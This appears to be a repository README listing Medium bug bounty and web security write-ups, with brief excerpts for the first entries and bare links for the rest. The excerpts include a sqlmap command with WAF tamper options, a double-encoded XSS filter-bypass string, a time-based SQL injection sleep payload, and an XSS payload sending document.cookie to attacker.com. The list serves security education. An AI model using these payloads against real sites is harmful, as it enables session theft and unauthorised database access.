## Cybersecurity Medium Blogs

This repository serves as a collection of insightful and informative blog posts about cybersecurity, originally published on Medium.

- **[SQLi Time-Based Blind Finding Methods @erkankavas](https://medium.com/@erkankavas/sqli-time-based-blind-finding-methods-cdef02de2d0e)**

  As a bug hunter, it is essential to remain ethical and handle such situations professionally. Some individuals react impulsively and retaliate inappropriately in such cases. However, it’s crucial to    maintain self-control.

  ``sqlmap -u "targetlink" -p parameter --tamper=space2comment --dbs --random-agent``

- **[Bypassing WAFs: A Unique XSS Exploit Journey and Insights @erkankavas](https://medium.com/@erkankavas/bypassing-wafs-a-unique-xss-exploit-journey-and-insights-520d7060c281)**
  
  Using two-level encoding like this allowed us to bypass the WAF and conceal the payload.

  To make such payloads more convincing, you can prepend random characters or specific terms, elevating the attack to another level.

  ``%253c---key---%253e---key2—-%2528---emoji---%2529%253c%252f---key---%253e``

- **[Discovering SQLi Vulnerabilities Through Deeper Analysis @erkankavas](https://medium.com/@erkankavas/discovering-sqli-vulnerabilities-through-deeper-analysis-4e305dfbc181)**

  As I’ve mentioned before, the reconnaissance phase is incredibly important, and you should continue your reconnaissance efforts even after finding an initial vulnerability.

  Every small mistake might lead you to something much bigger, so patience and keeping your eyes open are key.

  ``+(select*from(select(sleep(20)))a)+`` 

- **[Hidden Dangers of XSS Vulnerabilities — Real Case @erkankavas](https://medium.com/meetcyber/hidden-dangers-of-xss-vulnerabilities-real-case-22177daa6fc8)**

  With this XSS payload, you can change the location in a reflected XSS vulnerability and redirect the page.

  Another favorite of mine is a payload that allows you to steal cookies:

  ``<script>new Image().src="https://attacker.com/cookie.php?cookie="+document.cookie</script>``

- **[Humorous XSS Vulnerabilities in a Movie Website @erkankavas](https://medium.com/meetcyber/humorous-xss-vulnerabilities-in-a-movie-website-3600d7828661)**

  The system’s logic involves creating a new list from the “Create New List” section in the user profile, naming it, and then adding movies and TV series to curate a personalized list.

  This list is then published on your profile. However, due to a critical oversight by the developers, it’s possible to upload XSS payloads into the list’s title field using a simple trick.

  ```
    <script>
    document.body.addEventListener('click', () => 
    setTimeout(() => 
        new Audio('https://www.myinstants.com/media/sounds/among-us-role-reveal-sound.mp3').play(), 2000), 
    { once: true });
    </script>
  ```

- **[A New Bug Hunting Story: Open Redirection Vulnerability @erkankavas](https://medium.com/meetcyber/a-new-bug-hunting-story-open-redirection-vulnerability-33a1b6374f88)**

  Open redirection bugs generally occur in areas designed to redirect users automatically after completing a form or triggering an action, such as through parameters like refURL, returnURL, followURL. These vulnerabilities can be exploited to      manipulate users into being redirected to a malicious site after completing legitimate actions on the real website.

- **[Account Takeover in Mobile Apps: How to Exploit Vulnerabilities @erkankavas](https://medium.com/meetcyber/account-takeover-in-mobile-apps-how-to-exploit-vulnerabilities-dc1b55ef6891)**

  In the login section, when a user logs in, if the API returns a status : success and redirects you to the member-viewing frame, it is important to check for any vulnerabilities.

  Similarly, when registration is successful, the app either redirects to the main frame or shows an error message. At this point, create a temporary email, register, and analyze the requests using Burp Suite.

- **[How i find sensitive files in 2 minutes @securityinsights](https://medium.com/@securityinsights/how-i-find-sensitive-files-in-2-minutes-easy-bug-2-d53965b7e4f4)**

  While browsing a website, we only see the content intended for users. But wait — there’s more! Hidden files on websites may contain sensitive information like usernames, passwords, API keys, personal data, organizational secrets, cookies, or     tokens.

  Some files might even be left on the server by mistake. If these fall into a hacker’s hands, they could lead to a serious data breach.

- **[Zero-Click Account Takeover @osamamohamed21212121](https://medium.com/@osamamohamed21212121/zero-click-account-takeover-critical-bug-ab31f27b8674)**

  Account takeover vulnerabilities are among the most critical security flaws as they allow attackers to gain full control over user accounts. There are two main types of account takeover vulnerabilities:

  - Zero-Click Account Takeover: This type does not require any interaction from the victim.
  - One-Click Account Takeover: This type requires minimal interaction, such as clicking a link.

- **[Bypassing Rate Limit Protection to Account Takeover @sohailahmed0x0](https://medium.com/@sohailahmed0x0/bypassing-rate-limit-protection-to-account-takeover-fe44598fc1df)**
  
  Rate limit vulnerabilities are security weaknesses that occur when a system or service doesn’t properly enforce limits on how many requests a user or system can make in a given time period. Essentially, these vulnerabilities arise when the       system allows excessive requests from the same source or allows the rate of requests to exceed what is typical or safe.

- **[How I Found a Bug in Sony and Earned Exclusive Swag! @josekuttykunnelthazhebinu](https://medium.com/@josekuttykunnelthazhebinu/how-i-found-a-bug-in-sony-and-earned-exclusive-swag-f565d56c395e)**

  After some analysis, I came across an interesting parameter named error. This caught my attention, and I knew it was worth digging deeper.

  The url was like this:

  ```
  https://target.com/my/login/errormessage?error=
  ```
  
  I tried the text injection and when I added the injection text it was not reflecting the way I expected, then I encoded the text and when submitted it was reflecting in the page in the format as expected.

- **[Easiest $225 Ever: A Simple SQL Injection Win! @whoadnan01](https://medium.com/@whoadnan01/easiest-225-ever-a-simple-sql-injection-win-f40c0a6b8e45)**

  This left me with around 50–60 live subdomains. From there, I randomly picked about 20–30 subdomains and opened them all at once using a Chrome extension called “Open Multiple URLs.”
  While going through the subdomains, a few immediately stood out. One of them had a “page=” parameter in the URL, which instantly caught my attention.
  
  ```
  subfinder -d example.com -o example.txt
  cat example.txt | httpx -status-code -mc 200,301 -silent

  ```

- **[From Newbie to Pro: My Journey to a $3,000 Bug Bounty @myselfakash20](https://medium.com/bugbountywriteup/from-newbie-to-pro-my-journey-to-a-3-000-bug-bounty-61abe935e3db)**
  
  It took weeks of persistence before I found my first vulnerability. It was an IDOR (Insecure Direct Object Reference) in a small web app. By manipulating a single parameter in the URL, I could access invoices from other users.

  It was like magic — one parameter changed, and the doors swung open!
  
- Discovering a Critical Vulnerability in Deepseek’s Password Reset Functionality leads to Zero Click Account Takeover

  https://medium.com/@teamtea.ye/discovering-a-critical-vulnerability-in-deepseeks-password-reset-functionality-leads-to-zero-click-96c597fe852c

- How I Earned a $500 Bounty by Exploiting a Hidden Vulnerability (Without Even Trying)
  
  https://medium.com/@thedevtaskofficial/how-i-earned-a-500-bounty-by-exploiting-a-hidden-vulnerability-without-even-trying-d22229d4d8bd

- Finding Exposed Sensitive API Keys in JS Files

  https://medium.com/@bitpanic/finding-exposed-sensitive-api-keys-in-js-files-5c129fb1f2c7

- A Security Gap (PII) in a Bus Company

  https://medium.com/meetcyber/a-security-gap-pii-in-a-bus-company-ecfe972875ff

- Exploring a New SQLi Vulnerability: A Ghauri Experience
  
  https://medium.com/meetcyber/exploring-a-new-sqli-vulnerability-a-ghauri-experience-541c588dc00d

- 1000$ Bounty: OAuth Bypass
  
  https://medium.com/cybersecuritywriteups/1000-bounty-oauth-bypass-97c3658729c0

- Automating Ghauri for SQLi with Bash Script

  https://medium.com/meetcyber/automating-ghauri-for-sqli-with-bash-script-6ce8fb62c367

- The Importance of Proxy Usage in Bug Hunting

  https://medium.com/meetcyber/the-importance-of-proxy-usage-in-bug-hunting-9896618da7fc

- Running DeepSeek Locally on macOS with Ollama

  https://medium.com/meetcyber/running-deepseek-locally-on-macos-with-ollama-cd8cd5d6dfce

- How i found Location of Users in Public BBP

  https://medium.com/system-weakness/how-i-found-location-of-users-in-public-bbp-in-2-minutes-easy-bug-3-143378a4c35d

- Mobile Pentesting with Frida: A Beginner’s Guide

  https://medium.com/meetcyber/mobile-pentesting-with-frida-a-beginners-guide-996411fa0202

- User Interface Says No, Backend Says Yes

  https://medium.com/@som3a/user-interface-says-no-backend-says-yes-story-of-bypassing-email-verification-b469f20a141f

- How to Discover EXIF Metadata Leaks from Images

  https://medium.com/h7w/how-to-discover-exif-metadata-leaks-from-images-easy-p4-p3-bugs-44cf6b1cb875

- How I Found Multiple SQL Injections in 5 Minutes in Bug Bounty

  https://medium.com/bugbountywriteup/how-i-found-multiple-sql-injections-in-5-minutes-in-bug-bounty-40155964c498

- How I Found XSS Using ChatGPT

  https://medium.com/@kumawatabhijeet2002/500-how-i-found-xss-using-chatgpt-ec55792e35bb

- Finding CSRF Vulnerabilities!

  https://medium.com/@kumawatabhijeet2002/earn-by-finding-csrf-vulnerabilities-638f876918cf

- How I got a Stored XSS by searching through JS files?

  https://medium.com/@oXnoOneXo/how-i-got-a-stored-xss-by-searching-through-js-files-fdfe2490668b

- Turning XSS into Account Takeover

  https://medium.com/@HackerNasr/turning-xss-into-account-takeover-ato-how-to-level-up-your-exploit-16126c271476

- Automate Open Redirect and Earn

  https://medium.com/cybersecuritywriteups/automate-open-redirect-and-earn-250-200-100-b6bfd75a5dc7

- Bug Report Rejected? Here’s What You Can Do!
  
  https://medium.com/@HackerNasr/bug-report-rejected-heres-what-you-can-do-b4407d7c19b8

- CSRF Bypass Combined with IDOR To Complete Account Takeover!

  https://medium.com/@omarzzu/csrf-bypass-combined-with-idor-to-complete-account-takeover-f4995c5946d3

- How I Discovered a Critical PII on the main domain via Cookie Manipulation

  https://medium.com/@hhack4737/how-i-discovered-a-critical-pii-on-the-main-domain-via-cookie-manipulation-588a3f79710d

- Hijacking Sessions with IDOR and XSS— @bxmbn

  https://medium.com/@bxmbn/hijacking-sessions-with-idor-and-xss-bxmbn-396f99761a85

- Discovered a Unique Email Verification Bypass
  
  https://medium.com/@mo9khu93r/discovered-a-unique-email-verification-bypass-47bb1e955a13

- Bug using simple Graphql Introspection query
  
  https://medium.com/bugbountywriteup/1000-bug-using-simple-graphql-introspection-query-b68da8260877

- Extended Guide to Installing DeepSeek AI on Ubuntu

  https://medium.com/meetcyber/extended-guide-to-installing-deepseek-ai-on-ubuntu-bce1529de75c

- The Forgotten Google Services: Google Alerts

  https://medium.com/pndsec/the-forgotten-google-services-google-alerts-74502ba9c963

- The Power of OSINT: Tracking Torrent Activity with Python

  https://medium.com/meetcyber/the-power-of-osint-tracking-torrent-activity-with-python-a3246f5217e3

- Best VPS for Bug Bounty & Pentesting
  
  https://medium.com/meetcyber/best-vps-for-bug-bounty-pentesting-2b556c375f28

- Admin Account Takeover via Weird Password Reset Functionality

  https://medium.com/@danielbelay/day-20-admin-account-takeover-via-weird-password-reset-functionality-33afb15fa4c0

- How I found two api vulnerabilities by analyzing JS source code

  https://medium.com/@mohammed0x04/how-i-found-two-api-vulnerabilities-using-website-source-code-6c4b0dc54d6f

- Stored xss using PDF 👾 a bug?

  https://medium.com/@dsmodi484/stored-xss-using-pdf-a-bug-0690125015bb

- Hidden Gems: Simple Exploits Overlooked by Most Bug Hunters

  https://medium.com/infosecmatrix/hidden-gems-simple-exploits-overlooked-by-most-bug-hunters-3113cc1db4b8

- Bug Hunting Recon Guide: Find Hidden Vulnerabilities Like a Pro

  https://medium.com/the-first-digit/bug-hunting-recon-guide-find-hidden-vulnerabilities-like-a-pro-353accfe65c4

- How you can find your first bug using google

  https://medium.com/@shellyshubh/how-you-can-find-your-first-bug-using-google-c9327f82632e

- Understanding Basic Chmod
  
  https://medium.com/pndsec/understanding-basic-chmod-8b93a82baf95

- How to find & access Admin Panel by digging into JS files…

  https://medium.com/@ratnadip1998/how-to-find-access-admin-panel-by-digging-into-js-files-282d89391a2d

- How to find & access Admin Panel by digging into JS files

  https://medium.com/@ratnadip1998/how-to-find-access-admin-panel-by-digging-into-js-files-282d89391a2d

- How Interesting 2FA Bypass Through Browser Feature

  https://medium.com/@dishantsingh989/how-interesting-2fa-bypass-through-browser-feature-lead-me-to-critical-vulnerability-18f9c72a8f8d

- How I Found a Bug in Minutes

  https://medium.com/@strangerwhite/how-i-found-a-bug-in-minutes-no-tools-just-mindful-approach-to-testing-0dd034ff8ab9

- How I Found an IDOR Vulnerability – A Responsible Disclosure Story

  https://medium.com/@vickyrohith70/how-i-found-an-idor-vulnerability-a-responsible-disclosure-story-def2885bbe0c

- IDOR Unlocked: Accessing Unauthorized Data with a Simple Tweak!

  https://medium.com/@dharineeshj2/idor-unlocked-accessing-unauthorized-data-with-a-simple-tweak-a6a5a01a341f

- Advanced Chmod Usage
  
  https://medium.com/meetcyber/advanced-chmod-usage-46fad41e3330

- Can You Find a $4,500 Bug in Google Slides in Under 3 Hours

  https://medium.com/@ibtissamhammadi/can-you-find-a-4-500-bug-in-google-slides-in-under-3-hours-69e9113ccfd3

- Mastering 403 Forbidden Bypass Techniques

  https://medium.com/@Abhijeet_kumawat_/part-2-mastering-403-forbidden-bypass-techniques-707e7880fa22

- Basic Linux Commands

  https://medium.com/pndsec/basic-linux-commands-7c22973c9388

- Exceptional $$$$Account Takeover

  https://medium.com/@Tanvir0x1/exceptional-account-takeover-money-theft-via-idor-a76638ecd616

- Bug Bounty: Hunting Open Redirect Vulnerabilities

  https://medium.com/h7w/bug-bounty-hunting-open-redirect-vulnerabilities-for-46940d0cd98c

- SQL injection with filter bypass via XML encoding
  
  https://medium.com/@codingbolt.in/sql-injection-with-filter-bypass-via-xml-encoding-754808d7d29a

- Exploiting Blind XSS in a Signup Page:

  https://medium.com/@MianHammadx0root/exploiting-blind-xss-in-a-signup-page-admin-panel-takeover-and-real-world-impact-3000-p2-private-110205e3674b

- Top 10 Vulnerabilities Every Bug Hunter Should Exploit in 2025

  https://medium.com/@vipulsonule71/top-10-vulnerabilities-every-bug-hunter-should-exploit-in-2025-df28045f6fca

- How I Made $1,000 in a Day Exposing a Critical Vulnerability
  
  https://medium.com/@ibtissamhammadi/how-i-made-1-000-in-a-day-exposing-a-critical-vulnerability-3742ac0e58df

- Bug Hunting & Automation
  
  https://medium.com/h7w/bug-hunting-automation-a284c3ff1967

- How to Find Hidden API Endpoints That Lead to Critical Bugs

  https://medium.com/@vipulsonule71/how-to-find-hidden-api-endpoints-that-lead-to-critical-bugs-054310629e64

- 2FA & MFA Hacks: Bypass OTP Like a Pro

  https://medium.com/@verylazytech/2fa-mfa-hacks-bypass-otp-like-a-pro-verylazytech-7eb9f8c4f5c1

- Prime Target & The Future of RSA

  https://medium.com/meetcyber/prime-target-the-future-of-rsa-6e6bac4ad25b

- Account Takeover using SSO Logins

  https://medium.com/@rikeshbaniya/account-takeover-using-sso-logins-fa35f28a358b

- DOM XSS Custom Nuclei Template

  https://medium.com/meetcyber/dom-xss-custom-nuclei-template-189461186769

- SSRF to RCE: How I Turned a Small Bug Into a Big Paycheck
  
  https://medium.com/bugbountywriteup/%EF%B8%8F-ssrf-to-rce-how-i-turned-a-small-bug-into-a-big-paycheck-574b6b889d2a

- DuckDuckGo Dorking for Bug Hunters & Pentesters

  https://medium.com/developersglobal/duckduckgo-dorking-for-bug-hunters-pentesters-7c2b9b762ab9

- From Recon to RCE
  
  https://medium.com/bugbountywriteup/from-recon-to-rce-how-ai-and-a-cup-of-boost-helped-me-turn-sqli-into-a-command-injection-jackpot-1f62dc829956

- Bug Bounty Edition 2025: Uncommon Headers That Bypass Everything

  https://medium.com/@gasmask/uncommon-headers-that-bypass-everything-almost-bug-bounty-edition-2025-9d2ea65b2076

- How I Bypassed View-Only Mode

  https://medium.com/@mahdisalhi0500/how-i-bypassed-view-only-mode-with-a-simple-trick-duplicate-bug-92e1ec91a8d7

- CORS Misconfigurations: How Poor Policies Open Doors to Exploits

  https://medium.com/meetcyber/cors-misconfigurations-how-poor-policies-open-doors-to-exploits-ef0af71e0302

- 1 Click ATO on a public Bugcrowd Program

  https://medium.com/@68abdelrahmanmohamed/1-click-ato-on-a-public-bugcrowd-program-94ef037d0d50

- SQL Injection Leads to $$$ Bounty

  https://medium.com/@arrheniuspaelongan09/sql-injection-leads-to-bounty-how-i-found-a-critical-bug-cbacc35a2f19

- The Hacker’s Library: Uncovering the Best Books

  https://medium.com/@iabhipathak/the-hackers-library-uncovering-the-best-books-bd5dce11e7a6

- ARP Spoofing Lab Using Docker Compose and Wireshark

  https://medium.com/meetcyber/how-to-build-an-arp-spoofing-lab-using-docker-compose-and-wireshark-652cc9fbb01a

- Google just Punished GeekforGeeks

  https://medium.com/write-a-catalyst/google-just-punished-geekforgeeks-528ff2d3edad

- Hours of Recon, One Vulnerable Parameter

  https://medium.com/the-first-digit/hours-of-recon-one-vulnerable-parameter-and-boom-sql-injection-found-e7f2bb74d423

- How I made $64k from deleted files

  https://medium.com/@sharon.brizinov/how-i-made-64k-from-deleted-files-a-bug-bounty-story-c5bd3a6f5f9b

- Non-English Dorks to Find Bug Bounty & VDP Programs

  https://medium.com/cybersecuritywriteups/non-english-dorks-to-find-bug-bounty-vdp-programs-d799f0a5161c

- FOFA Recon for Hidden HackerOne & Bugcrowd Programs

  https://medium.com/meetcyber/fofa-recon-for-hidden-hackerone-bugcrowd-programs-e285610bf8a5

- Secret Sauce in Robots.txt
  
  https://medium.com/@iski/secret-sauce-in-robots-txt-how-i-found-hidden-admin-panels-and-debug-urls-b7e8a11ea36f

- Bypassed the Invite Flow, Gained Admin Access

  https://medium.com/@yassentaalab51/bypassed-the-invite-flow-gained-admin-access-d37347d57468

- Path Traversal Attack: How I Accessed Admin Secrets

  https://medium.com/bugbountywriteup/path-traversal-attack-how-i-accessed-admin-secrets-fa5de1865031

- Choosing the Right Naming Convention

  https://medium.com/meetcyber/choosing-the-right-naming-convention-780b2b1213ae

- Not Just a Ping: How SSRF Opened the Gateway to Internal Secrets
  
  https://medium.com/@iski/not-just-a-ping-how-ssrf-opened-the-gateway-to-internal-secrets-d18eeccd4745

- Understanding Supply Chain Attacks

  https://medium.com/meetcyber/understanding-supply-chain-attacks-19f97e8116cb

- AI and Machine Learning : Double Edged Sword

  https://medium.com/meetcyber/ai-and-machine-learning-double-edged-sword-093ffee1aa62

- Forbidden Knowledge: Banned Cybersecurity Reads

  https://medium.com/the-first-digit/forbidden-knowledge-banned-cybersecurity-reads-a4bdba77f26e

- Bugged by Backup Files: How .zip and .bak

  https://medium.com/bugbountywriteup/bugged-by-backup-files-how-zip-and-bak-gave-me-the-source-code-872a376b0b2b

- The Evolution of macOS

  https://medium.com/meetcyber/the-evolution-of-macos-142fad535449

- Understanding the Core Concepts of OOP

  https://medium.com/meetcyber/understanding-the-core-concepts-of-oop-0b258fbe86e4

-  Bypassing Regex Validations to Achieve RCE

  https://medium.com/bugbountywriteup/bypassing-regex-validations-to-achieve-rce-a-wild-bug-story-4c523f69b9f8

- The Hidden Dangers of Misconfigured Cloud Storage

  https://medium.com/meetcyber/the-hidden-dangers-of-misconfigured-cloud-storage-c9debc08f506

- Essential Programming Languages with Ecosystems

  https://medium.com/meetcyber/essential-programming-languages-with-ecosystems-cec8f61a1139

- Unsafe Eval = Unlimited Control: How a JS Sink Let Me Run Anything

  https://medium.com/@iski/%EF%B8%8F-unsafe-eval-unlimited-control-how-a-js-sink-let-me-run-anything-60794929a295

- Found a Critical Vulnerability in Snapchat

  https://medium.com/meetcyber/15-000-bounty-found-a-critical-vulnerability-in-snapchat-377176a0f0eb

- A list of tools that will help to find XSS(cross-site scripting ) vulnerability.

  https://medium.com/@loyalonlytoday/a-list-of-tools-that-will-help-to-find-xss-cross-site-scripting-vulnerability-037dfe279f51

- The Hidden Language: Exploiting GraphQL for Unauthorized Data Dump

  https://medium.com/bugbountywriteup/the-hidden-language-exploiting-graphql-for-unauthorized-data-dump-8be49f30a005

- SSRF via PDF Generator? Yes, and It Led to EC2 Metadata Access
  
  https://medium.com/bugbountywriteup/ssrf-via-pdf-generator-yes-and-it-led-to-ec2-metadata-access-39b8e5b41840

- A tool that will find secrets, endpoints, and API keys from a list of URLs
  
  https://medium.com/@loyalonlytoday/a-tool-that-will-find-secrets-endpoints-and-api-keys-from-a-list-of-urls-bug-bounty-hunting-ccaec4babfe1

- Filter Failure: From HTML Injection to Full-Blown XSS via Rich Text Editors

  https://medium.com/@iski/title-filter-failure-from-html-injection-to-full-blown-xss-via-rich-text-editors-af6809e248b4

- $256 Bounty : XSS via Web Cache Poisoning in Discourse

  https://infosecwriteups.com/256-bounty-xss-via-web-cache-poisoning-in-discourse-594d5961555e

- POC — Remote and unauthenticated attacker can send crafted HTTP requests to execute arbitrary code

  https://medium.com/@verylazytech/poc-remote-and-unauthenticated-attacker-can-send-crafted-http-requests-to-execute-arbitrary-code-4b591d45ff4f

- My First Bug Bounty: How I Earned $1,000

  https://medium.com/@kailasv678/my-first-bug-bounty-how-i-earned-1-000-4ae2bf36039d

- All about XSS — Cross site scripting!

  https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39159

- Think You’re Safe? Think Again: Cybersecurity Myths

  https://medium.com/meetcyber/think-youre-safe-think-again-cybersecurity-myths-69090b7e7afa

- Mastering SQL Injection Recon: Step-by-Step Guide for Bug Bounty Hunters

  https://medium.com/bugbountywriteup/mastering-sql-injection-recon-step-by-step-guide-for-bug-bounty-hunters-9f493fb058dd

- 404 to Root: How a Forgotten Subdomain Led to Server Takeover

  https://medium.com/bugbountywriteup/404-to-root-how-a-forgotten-subdomain-led-to-server-takeover-%EF%B8%8F-d60e65fdbc18

- The $2,000 SQLi Story: Hours, Payloads, and Pure Stubbornness

  https://medium.com/meetcyber/the-2-000-sqli-story-hours-payloads-and-pure-stubbornness-05eab4c7b968

- I Gave Myself 60 Minutes to Find a Bug 

  https://medium.com/@Abhijeet_kumawat_/i-gave-myself-60-minutes-to-find-a-bug-this-is-what-happened-e5fa76563a33

- WayBackLister : Innovative Directory Bruteforcing Technique

  https://medium.com/system-weakness/waybacklister-innovative-directory-bruteforcing-technique-43535da40bc4

- How Blind XSS in Email Notifications Gave Me Root Alerts

  https://medium.com/@iski/silent-but-deadly-how-blind-xss-in-email-notifications-gave-me-root-alerts-e7d21972cdfc

- Exploiting Security Misconfiguration to Gain Full Account Takeover

  https://medium.com/@vashuvats/exploiting-security-misconfiguration-to-gain-full-account-takeover-eb7a3da01f14

- The Image That Spoke JavaScript

  https://medium.com/@commanak46/the-image-that-spoke-javascript-bdbd368921e4

- Wordpress Vulnerability Research

  https://medium.com/the-first-digit/wordpress-vulnerability-research-a2b3043f801d

- A Hidden Backdoor: Bypassing reCAPTCHA on the Sign-up Page
  
  https://medium.com/@ehteshamulhaq198/a-hidden-backdoor-bypassing-recaptcha-on-the-sign-up-page-2b5b3c18257f

- Hidden Tokens, Open Wallets: How I Found Payment API Keys in Production JavaScript

  https://medium.com/@iski/hidden-tokens-open-wallets-how-i-found-payment-api-keys-in-production-javascript-7810b3113e04

- Business Logic Flaw in a Rating System and Earned €150
  
  https://medium.com/meetcyber/business-logic-flaw-in-a-rating-system-and-earned-150-a992ceb571a1

- Logged in Without Logging In: A $xxx Improper Authentication Flaw

  https://medium.com/h7w/logged-in-without-logging-in-a-xxx-improper-authentication-flaw-in-tvas-portal-4c54c87bd512

- Open Redirect + Referer Header = $3,000 Access Token Leak

  https://medium.com/the-first-digit/open-redirect-referer-header-3-000-access-token-leak-dd45ba4bdb0c

- How Weak Tokens Let Me Become Admin with Just a Text Editor

  https://medium.com/bugbountywriteup/jwt-the-hell-how-weak-tokens-let-me-become-admin-with-just-a-text-editor-%EF%B8%8F-e73bcd66af0d

- Simple 2FA Bypass Techniques for Beginners

  https://medium.com/the-first-digit/simple-2fa-bypass-techniques-for-beginners-edec48befa23

- When Open Source Isn’t: How OpenRewrite Lost Its Way
  
  https://medium.com/bugbountywriteup/when-open-source-isnt-how-openrewrite-lost-its-way-642053be287d

- How I Hacked a $7,790 IDOR Flaw in 48 hours

  https://medium.com/@ibtissamhammadi1/ethical-hacker-earning-7-790-in-48-hours-by-finding-an-idor-vulnerability-during-a-bug-bounty-6557ffcd33c9

- How I Found a Secondary SQL Injection in a Top 3 Gaming Platform

  https://medium.com/@alkaptonurea/how-i-found-a-secondary-sql-injection-in-a-top-3-gaming-platform-abdd4eb461a7

- I reproduced a $10,000 bug

  https://medium.com/bugbountywriteup/i-reproduced-a-10-000-bug-28466603e45e

- How I Found an $8,427 JS Security Bug in 30 Minutes

  https://medium.com/@ibtissamhammadi1/how-i-found-an-8-427-js-security-bug-in-30-minutes-1c37d97bdae1

- ISC2 Certified in Cybersecurity CC exam

  https://medium.com/@erkankavas/isc2-certified-in-cybersecurity-cc-exam-86cccb3d976d

- 404 to $4,000: Exposed .git, .env, and Hidden Dev Files via Predictable Paths
  
  https://medium.com/bugbountywriteup/404-to-4-000-exposed-git-env-and-hidden-dev-files-via-predictable-paths-f5723b3ad3f8

- How I Made $4,260 Bypassing a Simple Username Bug

  https://medium.com/@ibtissamhammadi1/how-i-made-4-260-bypassing-a-simple-username-bug-d969868025c7

- OSINT Guide Pt 1 :Using Flatpak + Tor for Telegram OSINT

  https://medium.com/@hacktheplanet/osint-guide-pt-1-using-flatpak-tor-for-telegram-osint-73cd66825c2f

- The Most Underrated 0-Click Account Takeover Using Punycode IDN Homograph Attacks

  https://medium.com/bugbountywriteup/the-most-underrated-0-click-account-takeover-using-punycode-idn-attacks-c0afdb74a3dc

- I Found a $4,200 Bug in 15 Minutes

  https://medium.com/@ibtissamhammadi1/i-found-a-4-200-bug-in-15-minutes-8d1ce968cf6b

- The $500 Facebook Bug That Taught Me the Real Meaning of Respect

  https://medium.com/the-first-digit/the-500-facebook-bug-that-taught-me-the-real-meaning-of-respect-383d48be16ae

- I Found 50+ Exploitable Devices in 1 Hour Using Shodan Dorking

  https://medium.com/bugbountywriteup/i-found-50-exploitable-devices-in-1-hour-using-shodan-dorking-49e825ca0f3e

- When Session Fixation Meets Session Confusion: A Case of Cross-User Control

  https://medium.com/bugbountywriteup/when-session-fixation-meets-session-confusion-a-case-of-cross-user-control-bb2cd0d478e8

- How I Chained Recon and IDOR to Access 100's of Credit Cards

  https://medium.com/legionhunters/how-i-chained-recon-and-idor-to-access-100s-of-credit-cards-0ca50eb82a74

- How a Simple Bookmark Earned a Two-Digit € Bug Bounty.

  https://medium.com/meetcyber/how-a-simple-bookmark-earned-a-two-digit-bug-bounty-0a956537e5e5

- $1,000-Value Bug: Abusing Cookie-Based Voting to Manipulate Comments at Scale

  https://medium.com/bugbountywriteup/1-000-value-bug-abusing-cookie-based-voting-to-manipulate-comments-at-scale-7e3f3b672ad7

- JavaScript Proxies — The Most Underrated Superpower in JS
  
  https://medium.com/@theNewGenCoder/javascript-proxies-the-most-underrated-superpower-in-js-c907d5deb932

- Fail2Ban: Lightweight but Powerful Protection

  https://medium.com/pndsec/fail2ban-lightweight-but-powerful-protection-79f6bf514756

- SOC Analyst Automation: Scripts Every Analyst Should Be Using

  https://cyberw1ng.medium.com/soc-analyst-automation-scripts-every-analyst-should-be-using-6e310dea6ad5

- Best GPTs for Red Team, Blue Team & OSINT in 2025

  https://medium.com/meetcyber/best-gpts-for-red-team-blue-team-osint-in-2025-318cfed30886

- Rate Limit? I Barely Know Her: How I Brute-Forced OTPs Like a Gentleman
  
  https://medium.com/bugbountywriteup/rate-limit-i-barely-know-her-how-i-brute-forced-otps-like-a-gentleman-6f1235c559cc

- HTTP Parameter Pollution: The Dirty Little Secret That Gave Me Full Backend Access
  
  https://medium.com/bugbountywriteup/http-parameter-pollution-the-dirty-little-secret-that-gave-me-full-backend-access-%EF%B8%8F-f7777c569648

- You’re Missing Bugs If You’re Not Reconning Like This

  https://su6osec.medium.com/youre-missing-bugs-if-you-re-not-reconning-like-this-c037e0fbbb8a

- Flutter SSL Bypass
  
  https://medium.com/@m4kr0x/flutter-tls-bypass-how-to-intercept-https-traffic-when-all-other-frida-scripts-fail-bd3d04489088

- AI Powered Android APK Vulnerability Detection Tool

  https://medium.com/ai-apocalypse/ai-powered-android-apk-vulnerability-detection-tool-b371aaee3552

- SSRF: When Your Server Becomes a Nosy Hacker

  https://medium.com/@hettt/ssrf-when-your-server-becomes-a-nosy-hacker-part-1-f808b9513652

- The Hidden Graph: How API Rate Limits Lied and Let Me Scrape Millions

  https://medium.com/@iski/the-hidden-graph-how-api-rate-limits-lied-and-let-me-scrape-millions-761a7cc99270

- Fake Logins, Real Costs: The OTP Bug Worth €X,XXX
  
  https://medium.com/bugbountywriteup/fake-logins-real-costs-the-otp-bug-worth-x-xxx-74a422791385

- Hacking a Birthday Campaign on a Food Delivery App — Bug Bounty: $1.000+

  https://infosecwriteups.com/hacking-a-birthday-campaign-on-a-food-delivery-app-bug-bounty-1-000-22926fee1c31

- Just Wanted to Be a Driver, Ended Up Discovering a Time Capsule
  
  https://medium.com/bugbountywriteup/just-wanted-to-be-a-driver-ended-up-discovering-a-time-capsule-085808a4baa8

- Cariddi: Bug Bounty Recon
  
  https://medium.com/meetcyber/cariddi-ultimate-bug-bounty-recon-354f44f8bc9d

- How I Found My First Critical Bug: Account Takeover via Email Verification Bypass

  https://medium.com/@4m3n_d/how-i-found-my-first-critical-bug-account-takeover-via-email-verification-bypass-7481b814f902

- Subdomain Dork Recon via 3rd party

  https://medium.com/legionhunters/subdomain-dork-recon-via-3rd-party-54ea05b59a62

- Mass Message Injection and IDOR in Account Verification

  https://medium.com/@kingcoolvikas/mass-message-injection-and-idor-in-account-verification-c599b729321d

- Manus AI Agent for Red Teamers

  https://medium.com/ai-apocalypse/manus-ai-agent-for-red-teamers-a7117e421fc2

- Firebase Storage Bucket Recon

  https://medium.com/legionhunters/firebase-storage-bucket-recon-df5e5acb65e2

- $600 Bug Bounty received but in Parallel Universe

  https://medium.com/developersglobal/600-bounty-received-but-in-parallel-universe-a5466300446d

- Fuzzing Techniques for Maximum Bug Bounty Impact — ffufai Tool

  https://medium.com/bugbountywriteup/fuzzing-techniques-for-maximum-bug-bounty-impact-ffufai-tool-74e21735d6f1

- IDOR allow Zero Click account takeover on a web3 program
  
  https://medium.com/bugbountywriteup/idor-allow-zero-click-account-takeover-on-a-web3-program-abef994d2aef

- Insecure by Design: How a Mobile API Let Me Reset Anyone’s Password With Just a Phone Number
  
  https://medium.com/bugbountywriteup/insecure-by-design-how-a-mobile-api-let-me-reset-anyones-password-with-just-a-phone-number-ba588ec384e5
